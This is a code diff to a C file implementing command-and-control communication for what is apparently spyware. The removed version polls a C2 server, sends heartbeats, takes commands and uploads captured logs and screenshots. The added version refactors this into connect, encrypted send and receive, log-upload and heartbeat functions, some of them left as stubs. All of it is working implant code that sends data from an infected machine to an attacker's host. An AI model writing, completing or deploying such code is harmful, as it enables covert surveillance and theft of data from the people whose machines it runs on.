@@ -1,143 +1,138 @@
 #include "c2_communication_fixed.h"
-#include "config.h"
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 
 static int c2_socket = -1;
-static struct sockaddr_in c2_server;
+static int c2_connected = 0;
 
-void init_c2_communication() {
-	// Create socket
-	c2_socket = socket(AF_INET, SOCK_STREAM, 0);
-	if (c2_socket < 0) {
-		perror("socket creation failed");
-		return;
-	}
-	
-	// Configure server address
-	memset(&c2_server, 0, sizeof(c2_server));
-	c2_server.sin_family = AF_INET;
-	c2_server.sin_port = htons(C2_PORT);
-	
-	// Convert IPv4 and IPv6 addresses from text to binary form
-	if (inet_pton(AF_INET, C2_SERVER_IP, &c2_server.sin_addr) <= 0) {
-		perror("invalid address/address not supported");
-		close(c2_socket);
-		c2_socket = -1;
-		return;
-	}
+int c2_init(void) {
+    if (c2_connected) {
+        return 0;
+    }
+
+    // Create socket
+    c2_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (c2_socket < 0) {
+        perror("Failed to create socket");
+        return -1;
+    }
+
+    // Connect to C2 server
+    if (c2_connect() != 0) {
+        close(c2_socket);
+        c2_socket = -1;
+        return -1;
+    }
+
+    c2_connected = 1;
+    return 0;
 }
 
-int connect_to_c2() {
-	if (c2_socket < 0) {
-		init_c2_communication();
-	}
-	
-	if (c2_socket < 0) {
-		return -1;
-	}
-	
-	// Connect to server
-	if (connect(c2_socket, (struct sockaddr *)&c2_server, sizeof(c2_server)) < 0) {
-		perror("connection failed");
-		close(c2_socket);
-		c2_socket = -1;
-		return -1;
-	}
-	
-	return 0;
+void c2_cleanup(void) {
+    if (!c2_connected) {
+        return;
+    }
+
+    // Disconnect from C2 server
+    c2_disconnect();
+
+    // Close socket
+    close(c2_socket);
+    c2_socket = -1;
+    c2_connected = 0;
 }
 
-int send_data_to_c2(const char* data, size_t length) {
-	if (c2_socket < 0) {
-		if (connect_to_c2() < 0) {
-			return -1;
-		}
-	}
-	
-	return send(c2_socket, data, length, 0);
+int c2_send_data(const char *data, size_t size) {
+    if (!c2_connected) {
+        fprintf(stderr, "Not connected to C2 server\n");
+        return -1;
+    }
+
+    // Encrypt data before sending
+    char encrypted_data[size * 2];
+    encrypt_traffic(data, size, encrypted_data);
+
+    // Send data
+    ssize_t bytes_sent = send(c2_socket, encrypted_data, size * 2, 0);
+    if (bytes_sent < 0) {
+        perror("Failed to send data");
+        return -1;
+    }
+
+    return bytes_sent;
 }
 
-int receive_data_from_c2(char* buffer, size_t buffer_size) {
-	if (c2_socket < 0) {
-		if (connect_to_c2() < 0) {
-			return -1;
-		}
-	}
-	
-	return recv(c2_socket, buffer, buffer_size - 1, 0);
+int c2_receive_data(char *buffer, size_t buffer_size) {
+    if (!c2_connected) {
+        fprintf(stderr, "Not connected to C2 server\n");
+        return -1;
+    }
+
+    // Receive data
+    ssize_t bytes_received = recv(c2_socket, buffer, buffer_size - 1, 0);
+    if (bytes_received < 0) {
+        perror("Failed to receive data");
+        return -1;
+    }
+
+    // Decrypt data
+    char decrypted_data[buffer_size];
+    decrypt_traffic(buffer, bytes_received, decrypted_data);
+    memcpy(buffer, decrypted_data, bytes_received);
+    buffer[bytes_received] = '\0';
+
+    return bytes_received;
 }
 
-void close_c2_communication() {
-	if (c2_socket >= 0) {
-		close(c2_socket);
-		c2_socket = -1;
-	}
+int c2_send_logs(const char *log_data, size_t log_size) {
+    // Implementation would go here
+    return c2_send_data(log_data, log_size);
 }
 
-void* c2_communication_main(void* arg) {
-	// Main C2 communication loop
-	char buffer[1024];
-	int bytes_received;
-	
-	while (is_payload_running()) {
-		if (connect_to_c2() == 0) {
-			// Send heartbeat
-			send_data_to_c2("HEARTBEAT\n", 10);
-			
-			// Receive commands
-			bytes_received = receive_data_from_c2(buffer, sizeof(buffer));
-			if (bytes_received > 0) {
-				buffer[bytes_received] = '\0';
-				// Process command
-				process_c2_command(buffer);
-			}
-			
-			close_c2_communication();
-		}
-		
-		// Sleep before next attempt
-		sleep(C2_POLL_INTERVAL);
-	}
-	
-	return NULL;
+int c2_receive_command(char *buffer, size_t buffer_size) {
+    // Implementation would go here
+    return c2_receive_data(buffer, buffer_size);
 }
 
-void process_c2_command(const char* command) {
-	// Process C2 commands
-	if (strstr(command, "UPLOAD_LOGS") != NULL) {
-		// Upload logs to C2 server
-		upload_logs();
-	} else if (strstr(command, "UPLOAD_SCREENSHOTS") != NULL) {
-		// Upload screenshots
-		upload_screenshots();
-	} else if (strstr(command, "EXIT") != NULL) {
-		// Exit payload
-		stop_payload();
-	}
+int c2_connect(void) {
+    struct hostent *server = gethostbyname(C2_SERVER);
+    if (server == NULL) {
+        fprintf(stderr, "Failed to resolve C2 server: %s\n", C2_SERVER);
+        return -1;
+    }
+
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
+    server_addr.sin_port = htons(C2_PORT);
+
+    // Connect to server
+    if (connect(c2_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Failed to connect to C2 server");
+        return -1;
+    }
+
+    return 0;
 }
 
-void upload_logs() {
-	// Upload log file to C2 server
-	FILE* log_file = fopen(LOG_FILE, "r");
-	if (log_file) {
-		char buffer[1024];
-		size_t bytes_read;
-		
-		while ((bytes_read = fread(buffer, 1, sizeof(buffer), log_file)) > 0) {
-			send_data_to_c2(buffer, bytes_read);
-		}
-		
-		fclose(log_file);
-	}
+void c2_disconnect(void) {
+    if (c2_connected) {
+        shutdown(c2_socket, SHUT_RDWR);
+        c2_connected = 0;
+    }
 }
 
-void upload_screenshots() {
-	// Upload screenshots to C2 server
-	// Implementation depends on OS and screenshot storage
+int c2_is_connected(void) {
+    return c2_connected;
+}
+
+void c2_heartbeat(void) {
+    if (c2_connected) {
+        const char *heartbeat = "HEARTBEAT\n";
+        c2_send_data(heartbeat, strlen(heartbeat));
+    }
+}
+
+int c2_check_server_status(void) {
+    // Implementation would go here
+    return c2_connected ? 0 : -1;
 }
